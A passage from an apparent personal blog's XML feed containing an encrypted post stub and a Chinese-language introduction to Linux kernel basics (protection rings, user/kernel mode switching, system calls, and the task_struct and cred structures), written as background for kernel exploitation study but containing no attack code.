64d5f34585b9cbe222797eee8caa0986bb44c25e024a343fcd3dbf432ba186391cfba60eba3d5f819a260f84ab17639d6b0023bdf56fdb1cddc585fa7ad05093d84ad1b120d6a8a563d1e8945fbcde3666f37db69a2610f7f7c4fe9cbd3adbe92621f32d118f884a7ac83e83640c01623d47f69d5a1cbebd5e09612590e9ecae4f22c336b04854ac8ce37b699c4a457bf79e6db6ef3bcb7a51feabc28e8b5e12f050a68574fed62224ae336f565008de9f18a8ebbeb81248c8314382b195c2b3565c374b56981045836ce9166284a5f64231594e389ed201c22e9d840b22a205ebe6534af723fbb54d520fa81d3a74d2512f63d7e301a220b9f443620fc0c02224e64da1ee8783e5697c716e9c6cdaf43e8cb8e143eb1d240cd32f95ea6e991e32baef754557ce000a52ac643cba7a47be5e58b4fd6118ff99b46f1095242ff20ac6a17ef5ee9b063f263d43b95b26dbc44320e73389bd0f8295aa2a023bb4f91dd923b6fade603c2abbbf832d08bed387825e31ac9a2cabc946b2ca556617198e4a49a39bddca7ff65de5bed733e2f127d9d5e5d91bd58f6c6ceaf2f043b09ed83ca49a85c85f445cce9fdbc5e2f833ebb8f9cf2c1ffb8975c6e4f5de276ee559fe297e4de889e60bd9a7ef6448b2ae530c83b04050a91aec9142f50856ee92ff73fcc066e9a2a211d4e178355c7dea9967cdbd6f53fda22e6f478119c5a4fa82db0fb8802d16e9228f8ec7d68730e819d158b346dd5a2a4412cf7693f96d649412c17f5db58a8d44832477833e51283f1de0cecdfff15c2819276d3e80129a32d71cbcf05f71e44796e4b4c981932648009abaa772f63a292445b064a7b850c9142a59bc5ff82d36465993e474476368861fec799a499c6c0233a70d247468e2aa716627f0708017a69c2fd7f810299ceee888528e81719543de0ec6429232d79c9d3fb49bcf2cd6cb6129a70d65a8cc38bd36c1427b4c9332a73f4396434b0ddd262abb4af20025a564dc2ef60ba3dc303a351dc23c3f46a0cd1b6c38ace7eb6bef24c8e417fd4de0a7d020b1d47cc5264de6b624353b35a79a76a09d39f66cdc611b919809b09c13fed98de91e1a0c1c4226e994af94151fa590940a375fe947edbf9265361f9ab6d3d973cd42fa73914a98a646f3f04aea300a5756fd4fbfb4e3f70651182f67494d01341da36e1e2b9c33a75aef99d3cc5b940b90c4915aae222c58eafcbd8264ee0a28c239bdfb806753548015a178b23d6cac7098c2a9275795624aa6bf8b4c1ebe43d55d18b588816e684468d922edfb88fb08d4c1ab9894da9135b398687a33a1b96d548dfb6325a4e624a38dfbaceb351f44d132432bb8ccce89e83fe1cb67e0fea50438d443b2ac79719bbc71cc02f8a7b6fd8464528dbfa28b18a59e7b0fe6ed86f474e59dec93855a2d0922d800a64a6b164ce280f023a1484084e3ec21c1f115516927efc1d4a90e28b4d66d0ee4c81b89d703c57da3f29b36f88c73a6725223f272e7efb63dbb009bb0f7937a3252549a1f45e2d79013423fd8d680a8bab1d57212110b36110b1e569419e3c2eeb2f42ecf326a57dfa3ef3e95e15b9e3eeb3ff527de2c859c9fd0a24919bda02723f2f81d337cd1bf146ea504fa8305a627483f68917a3f2628016294f160e622cab3e6a7011d8e1cd1bf8f2e43adaf84e65da108090832b5785142c0338025c1ff1475bd6c41ae8eff1bc7aa18f5cd37299562d80d42464fd3b61a15991b50b7861a2dda5724e5313dab6cda8e88ab7369566bff44e126bfd7da96c4cbeb2a49b72c5d801310d73815639b0502f2a329466b0ab64bb65a1d12b328bc8caa5d6821887d0645b3837bbfc5a5a5f72f7ac060ba3e29d1b8e687fd0f2370c80b2123dc34c7b388ef74b8bf3dd6e48fc286347eefa740933531018f8cfc8f8e27b7aa2facbd7f00fd2c67ffacc8aaa5fa075db97699af3bfc0ae8bf665576b1bcd2cbdec1b623030866315dcbfb337236d28b109e9ad73e42a5cf5fc658ae2d9c99c00e8b21997693131405a9359cb91a421898c6414c4e504c2dd2d0f96fde55690e04170e5853af2f54c96bac9051a8442f8d947b2f54d49e967bcb53506b9d80dc212fe0258b70cc31d06edaaa872aa92b5720298d03cc390e641f26ca9e15d880cdda5cfc76a7cd05bdefff80bddda9244bec72d8163827f8a7116729c73ad02945e92045535b4e1787feb0cdc9c8ab1f2035f944ef11c415d3cb98c8dd061360091e499dda1b50fb972d463294eb2525191868f0abf5fb5fdd2bbc59edbe18cfb70919f0a7c2b37a84637ee7c39519d818532845d55af7c4c120604b99b63dc5f1eaabcaefc292cb0e248329e4c54218fca68da05776129e38177325d1311d57cb1b2e3e768df8ec209e6d589f9ea2791bcb560f92fdc024c847a04193952f32cc2ce1d0678f5c694ab0d1b395da55972b15eb415032bb72a9bd612dda88f8558bce365685887832568da91089843c1ae20b89019c1e6c23937f5dc695ce50e2c71177b75ca40f370af91f5d342b73a30bfad803ac4240b152ca22ebec5b0079dae4b6e2c58b8d1aec6f3195c6d32a60a51d39dfccc86f372c53e05f4eae90b9f148c5f1c34d3dc7ded3a2291c4b944e8f8146daac3627f2238ac14cb244f06485e82aaaecc68c94fb8e4260276926926bc20c89a2483e5a168f8457e4eba5a4a5fcd74b02ab1ed2fae9ac20b2479a675c1f9378b21e69b183dbbf0d47fcaeb43d4a8e6f875287b1191557a4e1e8df187487ec6a62752fc75a18a02bcec153b11a41b67628e52fcee874cbc9c2b87c82e3a02baaa738f7c86c4be6a58c3e55bbad6b07e09bb2bb5f1da054f65496a8a63171284880a23736c252d259d38ce0c664a1a557ce723bc69ada6e4d1216de28d115258b2a8eb807fbd030cddb10c2cf94ea9cc3a91ffc0c239842d55b6811aa24efbc3e810762fd6d3933293cc413360823eb2e3b82cfaf1ecd9b182e54abfde68f0d76c467aeff064fe9865117470c986d30e2fd51f9d8df2f7737df834948fe4675a07ebf9b5b07d6b4b0c3217d8c282b96fd6a195ed5e311512fea83670f83b2611f33d8a73ff4701680c47dad4b5c26ccdca28a93cf70608cd4f5495f72c155b1478633de9854379c92299be9aa03e5d410d000d7661abce117cceeb2c85bb2690fdb4412553404a4b6755bbc7a7df66f3ae90493dbd519cd2c27a73aa74a5ff3c5e269b1972b40cc6dfaa9496a49bda5e34cfa9eeb7aa093e86f6abce20a824a50ad1b6ff8dd01bb6d6a2f3ea30af669d0a22344de62b9196a6d111c7d0fe0c6b5ca1a3905c75ccf0f62e13de2bfb085f0ea049c2901945f4bf122ee27a590b2bad1dccdb3010d95ee07ff4b4ce7cbb15c87cd8a8d79e983bbd1e199e580f97f53923e521bc85c59c92e2cd2db3635c3569bccb79cc849ad01ed72aa7eaafa292bc98016c726b9cff4205ab4f07073f040782c611424d1814dc4f8d44075a7d82e5917b0eb6b0a63572cc44b5fe2afa1149f3779bf50cd6816de1546415f402ca0163b82e3fdd31ab5aa1e6baa22fa4a0fa168e5f73374ad14c8911f4b1b2d2414143a840a5c8eee1c55adb6282cf7b3304c06084f9eb1af5f04fe2e5f9fc34fbc4226589902bb6e83e3737428e037797920658438c1065ace658e60fe3925e1e7dafd79a66e03feb69f9b053f37f2a9d34e8a8fe553ce50297d3356a00ac3720316a3939e3f3ab881214bc0404d19593ec10df1767e50073ac67dfad3611883118e38c410d96ed1900615840209aa521570ac887444d87ddcd19e3268717669ffa43d5edcacab6d94de772cfb7cd67cf4272b83c8e10a6b1ce55eb1129c95cd4ae16ea866bb5d4f2b7c31b22171763fc847ff7a63fdab41a40bf189411fc2ae2b591660a82e97601b78bc2352314d8a84bd159589d02d2645d4531fafaf0bae2656fb3cc309186413d187e385ae2f006155ff09c6d8aaa242408cb3e2b7238c4a1bd02c022157c6f4ccab90453221b0ad08e1f90dbe133b698cfa8e1c30b2fe26f0fa81c625f1ee1c38c42e384cddcedb5ead48f121332288df8bba21dd02227a2925b48f264026635b02af08259c376b9f2c180f5cc2b917ab73af71c34a62e83bbe2ea6d1dbbd10cce27c7b4f3b7b6362ca04f7928de7bf410ee8450c7c2ff7f7e25c605906fd61c99ef2894896ca7e3bd760aac5b5ab89caaf026f5681d13f9c50c4d8eacf82e21156c7cad132de9d01fce851f95bf33ea1f4fc0961e2f8974144d0df2dccf043ede93068b03862b2622d4c9cd4c31d265c4ff57f5fc83a19430945214d0ee9d651d28e2e7a4c1333dab81e62e50e10ada26f5fced69c44a23f8b826b31b694d29539562d4726f5009be18b2713ffb1b13ca1d40862c310b1b03b257bb57fb6a34fd071dff3b24b5b9734211663b9b3d7ea1086e64445f692dcd89501b3e77d8182aef1d81dc19c7c0291c6433174db3d0cb452a538ba1adab8f78bbcbc82fb4e002e584540e1efbe9431c060deadf6434c3a944cb5c9c8d2897caf451775f0c545ce63eca811d45811d67043c72b73060fb4a1a8b94663efee2c4267e9a92539735a89baf6b2636ec6c4be335b571b37e91f691ccce0eb8967b71767f8cf3d854584267ecbe4da3c84f5a93cc6a57f213adc999d101b851c625ba2316de5450df24b9685428552d8750da0219062a25be5549e5e7b99682e4303abc3dc014ec8c3e5d7d489acbce67d2902e4860e81741a666e8e8ce37c6bb3fe8510e8ca8790502b4dfe41bfccb30f1a0df23b6810bf5ebf26bcffbcfbe279bc262ac1e5bd83d25aade0dbd2bc076f80867fb1cbb1cc884b09350d04343328c9f7925476edb41129c7f43cbc8bda26e42fc61210c3916038e875e04607c90b482821973959cdc6fd7827606dccb00c25143537492f79d5643590afffccd6537f5944d105528f15ae4087c6844572111963831eba163aa34afe95181901a5e3b6e5d367ab1a59416647aacc328a34969243a12c6a4216d15d89ab4de0947f577172b693bcf9c6483abfb5466a7dec187329fa8f533ef934bedb5509d87e3376e2ecf9e32cbc2de0c32c2eca3977ad9a492a0c1afbfcd1d5811eb05ddb10eac1aae984259fd957820ef356e8e78e3b531bbb316bacba31d96d94498ee2a54525a5210c14bb52d90b93b2e1c2f1d4ed114f502d5baf3cd9ba8ed1c9d8883a50379687c902d355225d985351e2581c690ece73d9348e56ecd0b5f2bf2c31d072b5d0130026b45ff75287233a5f72e0241f8f2dba97cd15b33e6d76df417076e6cfec28c109b41c468e7e6d28bbeb126e0d348977e6a4ce4929ffbdcbcf1fffc8747994c2ba731ed5fba538e034eda992a8cb6362bb5ea242033425d763ade54586e61dcb695f62b59ea0674c58bff4d00df015e01e59f052ca489e1780c1371e276927a9c95fa3f4d09749c2fce844d8e159e3aec358c953339b9a5a6952a649ad782bb83f632336735c5dc3c5c7745e06e74159d6d7e86e0995d8c1c0976a89c1fedf6b4d1ec59091d505de9c82c3f590e35ee3f29da0b4160352f96866793a803e1af7fd32af9c5d4dd83730766e72e78d1d01fe8b7a2eb7202b46c3693928fd57356ba16a3e588c29a729b00ba4650a49e2ee09740717604f48512b1915f66178f9ef8c7c303042cf0bcad1e6e873d39deeea6a21ec767035f567b80689004feb2908985f145c04e5a684e2b9dc1db05694d28b7ab8caf5c9acba8e4b1a7eacf61690cdaad41b1ff21d293f308cc8d89a0259ab13773bd42051aca66bbbd423d5b19ede3b82ad9c3a18d04036dc1daf1fc52e8371c81a53b77c80de6338b6270eda83ad0d4c2c3c06a1581f40940287ff47f2a0e03c69b42e03140e530ba0858ecf60e9b133e47701dfd92aaa9461e4e34486cdc2d93bb4e54a7c751aea9cb0ed30ce449bfe4ed12b93302a13ff1233105be45ab202c6ceda1a0feceacbf8cddb5d12a683f3aed1c1da3c1509ab440413f99387e70644e95b7003eba9af4d2333df42f9ec81f830b232c0f88fc1962bdb30de91e23e2e999185fa9337a5dae70a41518fc54f93409cdf40aceb5bf6abc8b829b354276adcdb185591fee553953593677229c1fb8f2b8ece192d6e3d193dd4cbdef36e32a93f39bc71d112c18a28ba46612fe74d578bd6c104bf0f0c8a3a9b4a9ed61c41613418638cb499a4d2f4e17f8d7631e342610694cee43cf4d08cbc3f8fafd0de10204f2ca82cd1769706eaefe74e18ddcfab8f1ed02b314b679ea914093ff4d5447bb961348ebdb17472361eb4d6078ce3a78ea8e1fa190f4abe796b12cb054cf2321af40f045e0cb935ab26f03747bfb298e41290762afe5601fcf750eed04fca2f40798e3e28ff405443c8e0fe7dd519497d2fcece4141e8a5335f38ea6072e63c544323255c351a8d4592f4dd9716ec024e0ba223548f3a3e8fcc7021da6ca3660990a8903bc303042e44cb0cc954c2d3ef102510fbe8c46d66bef336e2c89a6249ba3a6f76943c92c24c889d10299e2441b96162d34aad9e9ca6705f219345b16e72f2b10ba2fb2c3376ad9195d470da6294ee18134ba18001025f74b9ce5190613d225fadefd15af54a01a62637213a490aa98bfb839e9c98a41b8733065f9dd89441e5895fff2f618251ca6534925a6fa088c9815020c27d2ac2dd3137994c8adeda890eed5b121ef2236dadc22fa399f967e1ebb5483d7f1028b61a9fcb121a7be1e7a962a8772980d84d511156e2746a1ef38156ed19ae24c5a07957448bfe8b8b1d51e9160dd0a3076d71d082370e1a342425d264ae01a993d99e06e3239ef880d024b173928e63d3d79aaa19560f8c43371a6fba3336233c3068e7e011beebfc13f45e47593deabcfa1eea78e66ec4f9c97579fc82137076a0d0eec2aa61574c7f9f63f47cdf4ee96eb0ccd41b77299</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
  </entry>
  
  <entry>
    <title>【Kernel Pwn】Kernel base</title>
    <link href="https://billyotry.github.io/2021/04/02/%E3%80%90Kernel%20Pwn%E3%80%91Kernel%20base/"/>
    <id>https://billyotry.github.io/2021/04/02/%E3%80%90Kernel%20Pwn%E3%80%91Kernel%20base/</id>
    <published>2021-04-02T09:37:20.576Z</published>
    <updated>2021-04-04T06:15:45.492Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Linux-Kernel-Basic-Knowledge"><a href="#0x00-Linux-Kernel-Basic-Knowledge" class="headerlink" title="0x00.Linux Kernel Basic Knowledge"></a>0x00.Linux Kernel Basic Knowledge</h1><h2 id="一、内核"><a href="#一、内核" class="headerlink" title="一、内核"></a>一、内核</h2><p><strong>操作系统</strong> (Operation System) 本质上也是一种软件，可以看作是普通应用程序与硬件之间的一层中间层，其主要作用便是调度系统资源、控制IO设备、操作网络与文件系统，并为上层应用提供便捷、抽象的应用接口</p><p>而运行在内核态的<strong>内核</strong> (<strong>kernel</strong>) 则是<strong>一个操作系统最为核心的部分</strong>，提供着一个操作系统最为基础的功能</p><p>这张图说明了Kernel在计算机体系结构中的位置关系：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13367199984/0" alt="image-20210402174953686"></p><p>kernel的主要功能总结为以下三点：</p><ul><li><strong>控制并与硬件进行交互</strong></li><li><strong>提供应用程序运行环境</strong></li><li><strong>调度系统资源</strong></li></ul><p>包括I/O，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到以上三点中与一般的应用程序不同，kernel的carsh通常会引起重启</p><h3 id="内核架构：微内核-amp-宏内核（单内核）"><a href="#内核架构：微内核-amp-宏内核（单内核）" class="headerlink" title="内核架构：微内核 &amp; 宏内核（单内核）"></a>内核架构：微内核 &amp; 宏内核（单内核）</h3><p>通常来说我们可以把内核架构分为两种：<code>宏内核</code>和<code>微内核</code>，大致结构如下图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13368400036/0" alt="image-20210402234051680"></p><h4 id="宏内核（Monolithic-Kernel，又叫单内核）"><a href="#宏内核（Monolithic-Kernel，又叫单内核）" class="headerlink" title="宏内核（Monolithic Kernel，又叫单内核）"></a>宏内核（Monolithic Kernel，又叫单内核）</h4><blockquote><p>宏内核 (英语：Monolithic Kernel)，也以为<strong>集成式内核</strong>、<strong>单体式内核</strong>，一种<strong>操作系统内核</strong>架构，此架构的特性是整个内核程序是一个单一二进制可执行文件，在<strong>内核态</strong>以监管者模式 (Supervisor Mode) 来运行。相对于其他类型的操作系统架构，如<strong>微内核</strong>架构或<strong>混合内核</strong>架构等，这些内核会定义出一个高端的虚拟接口，由该接口来涵盖描述整个电脑组件，这些描述会集合成一组硬件描述用词，有时还会附加一些<strong>系统调用</strong>，如此可以用一个或多个模块来实现各种操作系统服务，如进程管理、并发 (Concurrency) 控制、存储器管理等。</p></blockquote><p>通俗的说，宏内核几乎将一切都集成到了内核当中，并向上层应用程序提供抽象API (通常是以系统调用的形式)</p><p>Unix与类Unix便是宏内核</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13368498708/0" alt="image-20210403002249917"></p><h4 id="微内核（Micro-Kernel）"><a href="#微内核（Micro-Kernel）" class="headerlink" title="微内核（Micro Kernel）"></a>微内核（Micro Kernel）</h4><p>对于微内核而言，大部分的系统服务 (如文件管理等) 都被剥离于内核之外，内核仅仅提供最为基本的一些功能：底层的寻址空间管理、线程管理、进程间通信等</p><p>Windows NT于Mach都宣称采用了微内核架构，不过本质上他们更贴近于混合内核 (Hybrid Kernel) ——在内核中集成了部分需要具备特权的服务组件。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13368504243/0" alt="image-20210403002651469"></p><blockquote><p>本文中主要讨论Linux内核</p></blockquote><h2 id="二、分级保护域"><a href="#二、分级保护域" class="headerlink" title="二、分级保护域"></a>二、分级保护域</h2><p><strong>分级保护域</strong>（<strong>hierarchical protection domains</strong>）又被称作保护环，简称Rings，是一种将计算机不同的资源划分至不同权限的模型</p><p>在一些硬件或者微代码级别上提供不同特权态模式的CPU架构上，保护环通常都是硬件强制的。Rings是从最高特权级 (通常被叫做0级) 到最低特权级 (通常对应最大的数字) 排列的</p><p>在大多数操作系统中，Ring 0拥有最高特权，并且可以和最多的硬件直接交互 (比如CPU，内存)</p><p>内层ring可以任意调用外层ring的资源</p><h3 id="Intel-Ring-Model"><a href="#Intel-Ring-Model" class="headerlink" title="Intel Ring Model"></a>Intel Ring Model</h3><p>Intel的CPU将权限分为四个等级：<strong>Ring0</strong>、Ring1、Ring2、<strong>Ring3</strong>，权限等级依次降低</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13368510271/0" alt="image-20210403003134186"></p><p><strong>大部分现代操作系统只用到了ring0和ring3，其中kernel运行在ring0，用户态程序运行在ring3</strong></p><blockquote><p>使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring1 方法</p></blockquote><h3 id="用户空间-amp-内核空间"><a href="#用户空间-amp-内核空间" class="headerlink" title="用户空间 &amp; 内核空间"></a>用户空间 &amp; 内核空间</h3><p>用户空间为我们应用程序一般所运行的空间，运行在ring3权限的用户态</p><p>内核空间则是kernel所运行的空间，运行在ring0权限的内核态，所有进程共享一份内核空间</p><h4 id="用户态-amp-内核态"><a href="#用户态-amp-内核态" class="headerlink" title="用户态 &amp; 内核态"></a>用户态 &amp; 内核态</h4><p>通俗地说，<strong>当进程运行在内核空间时就处于内核态，而进程运行在用户空间则处于用户态</strong></p><p>在内核态下，进程运行在内核地址空间中，<strong>此时 CPU 可以执行任意指令</strong>，运行的代码也不受任何的限制</p><p>在用户态下，进程运行在用户地址空间中，此时CPU所执行的指令是受限的，且<strong>只能访问用户态下可访问页面的虚拟地址</strong></p><h3 id="进程运行态切换"><a href="#进程运行态切换" class="headerlink" title="进程运行态切换"></a>进程运行态切换</h3><p>应用程序运行时总会经历无数次的用户态和内核态直接的转换，这是因为用户进程往往需要使用内核所提供的各种功能 (如IO等)，此时就需要陷入 (trap) 内核，待完成之后再 “着陆” 回用户态</p><h4 id="信号机制"><a href="#信号机制" class="headerlink" title="信号机制"></a>信号机制</h4><p>Signals机制（由称之为软中断信号）是UNIX及类UNIX系统中的一种<strong>异步</strong>的进程间通信方式，用以通知一个进程发生了某个事件，通常情况下常见的流程如下图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13368518978/0" alt="image-20210403003848459"></p><ul><li>内核向进程发送signal，进程挂起，此时控制权移交给内核，进入内核态</li><li>内核会<strong>将用户态进程的寄存器逐一压入【用户态进程的栈上】</strong>，形成一个<code>sigcontext</code>结构体，接下来压入SIGNALINFO以及<strong>指向系统调用sigreturn的代码</strong>，用以在后续返回时恢复用户态进程上下文；压入栈上的这一大块内容称之为一个SigreturnFrame，同时也是一个<code>ucontext_t</code>结构体；接下来就是内核内部的工作了</li><li>内核完成其工作之后，向用户态进程发送消息，控制权回到用户态进程，用户态进程跳转到相应的signal handler以处理不同的信号，完成之后将会执行位于其栈上的第一条指令——<code>sigreturn</code>系统调用</li><li>内核通过sigreturn系统调用恢复用户态上下文信息，最后将控制权重新返还给用户态进程</li></ul><h4 id="用户态-—-gt-内核态"><a href="#用户态-—-gt-内核态" class="headerlink" title="用户态 —&gt; 内核态"></a>用户态 —&gt; 内核态</h4><p>由用户态陷入内核态主要有以下几种途径：</p><ul><li><strong>系统调用</strong></li><li><strong>异常</strong></li><li><strong>外设产生中断</strong></li><li><strong>…</strong></li></ul><h5 id="I-切换GS段寄存器"><a href="#I-切换GS段寄存器" class="headerlink" title="I.切换GS段寄存器"></a>I.切换GS段寄存器</h5><p>通过<code>swapgs</code>切换 GS 段寄存器，将 GS 寄存器和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用</p><h5 id="II-保存用户态栈帧信息"><a href="#II-保存用户态栈帧信息" class="headerlink" title="II.保存用户态栈帧信息"></a>II.保存用户态栈帧信息</h5><p>将当前栈顶 (用户空间栈顶) 记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp    </p><h5 id="III-保存用户态寄存器信息"><a href="#III-保存用户态寄存器信息" class="headerlink" title="III.保存用户态寄存器信息"></a>III.保存用户态寄存器信息</h5><p>通过 push 保存各寄存器值到栈上，以便后续“着陆”回用户态</p><h5 id="IV-通过汇编指令判断是否为32位"><a href="#IV-通过汇编指令判断是否为32位" class="headerlink" title="IV.通过汇编指令判断是否为32位"></a>IV.通过汇编指令判断是否为32位</h5><h5 id="V-执行系统调用"><a href="#V-执行系统调用" class="headerlink" title="V.执行系统调用"></a>V.执行系统调用</h5><p>在这里用到一个全局函数表<code>sys_call_table</code>，其中保存着系统调用的函数指针</p><h4 id="内核态-—-gt-用户态"><a href="#内核态-—-gt-用户态" class="headerlink" title="内核态 —&gt; 用户态"></a>内核态 —&gt; 用户态</h4><p>由内核态重新“着陆”回用户态只需要恢复用户空间信息即可：</p><ul><li><code>swapgs</code>指令恢复用户态GS寄存器</li><li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li></ul><h2 id="三、系统调用"><a href="#三、系统调用" class="headerlink" title="三、系统调用"></a>三、系统调用</h2><p><strong>系统调用</strong>（<strong>system call</strong>）是由操作系统内核向上层应用程式提供的应用接口，操作系统负责调度一切的资源，当用户进程想要请求更高权限的服务时，便需要通过由系统提供的应用接口，使用系统调用以<strong>陷入内核态，再由操作系统完成请求</strong></p><p>系统调用本质上与一般的C库函数没有区别，不同的是系统调用位于内核空间，以内核态运行</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13368529740/0" alt="image-20210403004923246"></p><blockquote><p>Windows系统下将系统调用封装在win32 API中，不过本文主要讨论Linux</p></blockquote><h3 id="系统调用表"><a href="#系统调用表" class="headerlink" title="系统调用表"></a>系统调用表</h3><p>所有的系统调用被声明于内核源码<code>arch/x86/entry/syscalls/syscall_64.tbl</code>中，在该表中声明了系统调用的标号、类型、名称、内核态函数名称</p><p>在内核中使用<code>系统调用表（System Call Table）</code>对系统调用进行索引，该表中存储了不同标号的系统调用函数的地址</p><h3 id="进入系统调用"><a href="#进入系统调用" class="headerlink" title="进入系统调用"></a>进入系统调用</h3><p>进入系统调用有两种主要的方式：</p><ul><li>执行<code>int 0x80</code>汇编指令（80号中断）</li><li>执行<code>sysenter</code>汇编指令（only intel）</li></ul><p>接下来就是由用户态进入到内核态的流程</p><p>与一般的函数调用规范不同，Linux下的系统调用以<code>eax</code>寄存器作为<strong>系统调用号</strong>，<code>ebx、ecx、edx、esi、edi、ebp</code>作为第一个参数、第二个参数…进行参数传递</p><h3 id="退出系统调用"><a href="#退出系统调用" class="headerlink" title="退出系统调用"></a>退出系统调用</h3><p>同样地，退出系统调用也有对应的两种方式：</p><ul><li>执行<code>iret</code>汇编指令</li><li>执行<code>sysexit</code>汇编指令（only Intel）</li></ul><p>接下来就是由内核态回退至用户态的流程</p><h2 id="四、进程权限管理"><a href="#四、进程权限管理" class="headerlink" title="四、进程权限管理"></a>四、进程权限管理</h2><p>前面我们讲到，kernel调度着一切的系统资源，并为用户应用程式提供运行环境，相应地，应用程式的权限也都是由kernel进行管理的</p><h3 id="进程描述符（process-descriptor）"><a href="#进程描述符（process-descriptor）" class="headerlink" title="进程描述符（process descriptor）"></a>进程描述符（process descriptor）</h3><p>在内核中使用结构体<code>task_struct</code>表示一个进程，该结构体定义于内核源码<code>include/linux/sched.h</code>中</p><p>一个进程描述符的结构应当如下图</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13370298871/0" alt="image-20210403170639762"></p><p>本篇我们主要关心其对于进程权限的管理</p><p>注意到<code>task_struct</code>的源码中有如下代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">cred</span>;</span></span><br></pre></td></tr></table></figure><p><strong>Process credentials</strong>是kernel用以判断一个进程权限的凭据，在kernel中使用<code>cred</code>结构体进行标识，对于一个进程而言应当有三个cred：</p><ul><li><strong>ptracer_cred：</strong>使用<code>ptrace</code>系统调用跟踪该进程的上级进程的cred（gdb调试便是使用了这个系统调用，常见的反调试机制的原理便是提前占用了这个位置）</li><li><strong>real_cred：</strong>该进程的真实cred，通常是一个进程最初启动时所具有的权限</li><li><strong>cred： 该进程的有效cred，kernel以此作为进程权限的凭据</strong></li></ul><h4 id="cred结构体"><a href="#cred结构体" class="headerlink" title="cred结构体"></a>cred结构体</h4><p>对于一个进程，在内核当中使用一个结构体<code>cred</code>管理其权限，该结构体定义于内核源码<code>include/linux/cred.h</code>中，如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="keyword">void</span>*put_addr;</span><br><span class="line"><span class="keyword">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span 